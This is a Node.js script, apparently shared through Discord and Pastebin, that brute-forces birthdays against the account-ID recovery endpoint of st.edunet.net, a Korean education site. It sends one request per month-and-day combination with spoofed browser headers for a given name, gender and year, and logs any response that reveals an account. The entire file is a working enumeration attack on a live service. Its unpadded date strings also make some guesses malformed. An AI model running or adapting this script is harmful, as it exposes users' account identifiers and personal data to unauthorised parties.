//server: https://discord.gg/dXERgyqzVY
//msg: https://discord.com/channels/681090066512347146/708199545103974424/913809430729068604
//code: https://pastebin.com/68cjKJy8
function brute(bday, name, gen, year) {
    const req = require('https').request({
        host: 'st.edunet.net',
        path: '/member/findIdSearch',
        method: 'POST',
        headers: {
            "Host": "st.edunet.net",
            "Connection": "keep-alive",
            "Content-Length": 55,
            "sec-ch-ua": " Not A;Brand",
            "sec-ch-ua-mobile": "?0",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "X-Requested-With": "XMLHttpRequest",
            "sec-ch-ua-platform": "Windows",
            "Origin": "https://st.edunet.net",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://st.edunet.net/member/findInfo?gubun=&searchtype=id&in_div=nedu&isMobile=",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
        }
    }, function (res) {
        var data = ''
        res.on('data', function (chunk) {
            data += chunk
        })
        res.on('end', function () {
            try {
                if (data == '{"ResultCode":"-1","ResultMessage":"사용자가 존재하지 않습니다.","ErrorCode":"0001"}') {
 
                } else {
                    console.log(bday)
                    console.log(JSON.parse(data).ResultMessage)
                }
            } catch (e) {
                console.log('Error')
            }
        })
    })
    req.write('{\"name\":\"' + name + '\",\"gender\":\"' + gen + '\",\"birthday\":\"' + year + '' + bday + '\"}')
    req.end()
}
for (var month = 1; month <= 12; month++) {
    for (var day = 1; day <= 31; day++) {
        brute(month.toString() + day.toString(), '홍길동', 'M', '2000')
    }
}
